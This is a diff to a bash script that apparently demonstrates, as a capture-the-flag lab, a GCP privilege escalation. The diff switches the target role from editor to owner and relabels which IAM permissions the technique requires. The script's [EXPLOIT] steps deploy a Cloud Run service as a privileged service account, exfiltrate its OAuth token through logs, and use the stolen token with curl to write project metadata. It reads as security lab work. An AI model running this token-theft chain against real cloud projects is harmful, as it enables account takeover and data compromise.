@@ -14,7 +14,7 @@
 # invokes the service to trigger a fresh per-request exfil, reads the
 # exfiltrated token from Cloud Run logs, and uses the raw stolen token
 # directly against Google REST APIs (never re-impersonating via gcloud) to
-# prove it now holds target_sa's roles/editor project permissions.
+# prove it now holds target_sa's roles/owner project permissions.
 #
 # Payload mechanics: `python -c` bootstraps from the EXFIL_PAYLOAD env var.
 # gcloud's --args list splits values on commas (repeated --args flags and
@@ -36,18 +36,20 @@
 #     minted as starting_sa instead (run.routes.invoke — run.services.invoke
 #     is not a real GCP IAM permission). Verified permission classification
 #     (2026-11-01 leave-one-out isolation run, both modes green):
-#       run.services.get and logging.logEntries.list are REQUIRED even with
-#       the raw API (URL extraction + LRO polling + the logs exfil channel) —
-#       they live in the cr_deploy_req role, not the helpful role.
+#       run.services.create + run.operations.get (LRO polling) + actAs are the
+#       required technique (cr_deploy_req role). run.services.get and
+#       logging.logEntries.list are DEMO-PAYLOAD MECHANICS (this demo's URL
+#       discovery and its read-back of the exfiltrated token from Cloud Run
+#       logs) — not the core technique; they live in the cr_deploy_help role.
 #       The only gcloud-mechanic helpful permission is run.services.update
 #       (re-deploying to the service name left by a prior run takes the
 #       update path; a fresh deploy never needs it).
 #
 #   --api-only: uses the raw Cloud Run v2 REST API via curl. Requires only the
-#     verified raw-API minimum: run.services.create + actAs + run.services.get
-#     (fetch the service URL via urls[]) + run.operations.get (poll the async
-#     LRO) + logging.logEntries.list (read the exfiltrated token from the
-#     logs). Demonstrates the exact minimal permission surface of the attack.
+#     technique minimum: run.services.create + actAs + run.operations.get (poll
+#     the async LRO). This demo additionally uses the helpful demo-payload
+#     mechanics run.services.get (fetch the service URL via urls[]) and
+#     logging.logEntries.list (read the exfiltrated token from the logs).
 #
 # Re-running / switching modes: both modes use the same deterministic
 # SERVICE_NAME. gcloud mode re-deploys in place (its helpful run.services.update
@@ -144,7 +146,7 @@ for var_name in STARTING_SA_EMAIL TARGET_SA_EMAIL FLAG_SECRET_ID PROJECT_ID REGI
 done
 
 echo "Starting SA (no project role): $STARTING_SA_EMAIL"
-echo "Target SA   (roles/editor):    $TARGET_SA_EMAIL"
+echo "Target SA   (roles/owner):    $TARGET_SA_EMAIL"
 echo "Deployer    (your ADC):        $DEPLOYER_EMAIL"
 echo "Region:                        $REGION"
 echo "Project:                       $PROJECT_ID"
@@ -369,9 +371,8 @@ if $USE_GCLOUD; then
         tail -10 "$DEPLOY_STDERR_FILE"
         echo ""
         echo "Check that starting_sa holds iam.serviceAccounts.actAs on target_sa and"
-        echo "run.services.create (plus run.services.get, run.operations.get and"
-        echo "logging.logEntries.list, all verified required even with the raw API) on"
-        echo "the project."
+        echo "run.services.create (plus run.operations.get; this demo also uses the"
+        echo "helpful run.services.get and logging.logEntries.list) on the project."
         echo ""
         echo "Tip: run with --api-only to use the raw REST API, which needs fewer permissions"
         rm -f "$DEPLOY_STDERR_FILE"
@@ -481,8 +482,8 @@ else
     done
     SERVICE_DEPLOYED=true
 
-    # (c) Fetch the service URL (run.services.get — candidate required even
-    # with the raw API; the isolator will confirm).
+    # (c) Fetch the service URL (run.services.get — helpful demo mechanic,
+    # not part of the core technique).
     show_cmd "$STARTING_SA_EMAIL" \
         "curl -s -H 'Authorization: Bearer <redacted>' 'https://run.googleapis.com/v2/projects/$PROJECT_ID/locations/$REGION/services/$SERVICE_NAME' (run.services.get)"
     SERVICE_JSON=$(curl -s \
@@ -540,8 +541,8 @@ echo ""
 # Step 5: [EXPLOIT] Read the exfiltrated token from the Cloud Run logs
 # (exfil-mode logs). Poll for up to ~3 minutes: the cold start triggered by
 # step 4 may take a few seconds, and Cloud Logging lags slightly behind
-# container stdout. Requires logging.logEntries.list (granted in the required
-# role) — same channel gcpwn uses for --exfil-mode logs.
+# container stdout. Uses logging.logEntries.list (a helpful demo mechanic
+# granted in the helpful role) — same channel gcpwn uses for --exfil-mode logs.
 echo -e "${YELLOW}Step 5: [EXPLOIT] Exfiltrating target SA token from Cloud Run logs${NC}"
 
 EXFILTRATED_TOKEN=""
@@ -619,15 +620,15 @@ if [ "$TOKEN_EMAIL" != "$TARGET_SA_EMAIL" ]; then
 fi
 echo -e "${GREEN}✓ Confirmed: exfiltrated token belongs to $TARGET_SA_EMAIL${NC}\n"
 
-# Step 7: [EXPLOIT] Confirm editor-level write access using the raw stolen
+# Step 7: [EXPLOIT] Confirm owner-level write access using the raw stolen
 # token (project label write/restore round-trip) — not gcloud impersonation.
 # Uses the Resource Manager v1 projects.update method: a synchronous HTTP PUT
 # of the full Project resource (resourcemanager.projects.update, which
-# roles/editor includes). Note: v1 update is PUT-with-full-resource, NOT a
+# roles/owner includes). Note: v1 update is PUT-with-full-resource, NOT a
 # PATCH+updateMask — that shape belongs to the async v3 API and silently no-ops
 # against v1. Success is keyed on the HTTP status (200 = authorized, 403 =
 # denied/viewer-only), not the response body shape.
-echo -e "${YELLOW}Step 7: [EXPLOIT] Verifying roles/editor write access via raw stolen token${NC}"
+echo -e "${YELLOW}Step 7: [EXPLOIT] Verifying roles/owner write access via raw stolen token${NC}"
 show_cmd "$TARGET_SA_EMAIL (via exfiltrated token)" \
     "curl -X PUT 'https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID' -H 'Authorization: Bearer <redacted>' -d '<project JSON with added label>'"
 
@@ -647,7 +648,7 @@ PUT_BODY=$(echo "$PUT_RESPONSE" | sed '$d')
 
 if [ "$PUT_CODE" = "200" ]; then
     echo -e "${GREEN}✓ Successfully wrote a project label using the exfiltrated token!${NC}"
-    echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
+    echo -e "${GREEN}✓ PROJECT OWNER ACCESS CONFIRMED (roles/owner)${NC}"
     # Restore the original labels (PUT the pre-change resource back).
     curl -s -X PUT \
         -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
@@ -711,7 +712,7 @@ echo "    -> (run.services.create + iam.serviceAccounts.actAs on target_sa — T
 echo "    -> Cloud Run service '$SERVICE_NAME' deployed and running as $TARGET_SA_EMAIL"
 echo "       (image: docker.io/library/python:3.13-slim from public Docker Hub — no Artifact Registry)"
 echo "    -> exfiltrated OAuth access token (via metadata server → Cloud Run logs)"
-echo "    -> (roles/editor on project $PROJECT_ID)"
+echo "    -> (roles/owner on project $PROJECT_ID)"
 echo "    -> CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
@@ -728,10 +729,12 @@ if $USE_GCLOUD; then
     echo "  (2026-11-01 leave-one-out isolation run, both modes green):"
     echo ""
     echo "  Required even with the raw API (cr_deploy_req role):"
-    echo "    run.services.get       — fetch the service URL and readiness polling"
     echo "    run.operations.get     — poll the async deploy LRO"
-    echo "    logging.logEntries.list — reading the exfiltrated token from Cloud Run"
-    echo "                            logs (gcloud logging read)"
+    echo ""
+    echo "  Demo-payload mechanics (cr_deploy_help role, not the core technique):"
+    echo "    run.services.get       — this demo's service URL discovery / readiness polling"
+    echo "    logging.logEntries.list — this demo's read-back of the exfiltrated token"
+    echo "                            from Cloud Run logs (gcloud logging read)"
     echo ""
     echo "  gcloud-only mechanic (cr_deploy_help role, not part of the vulnerability):"
     echo "    run.services.update   — only needed when gcloud re-deploys to the service"
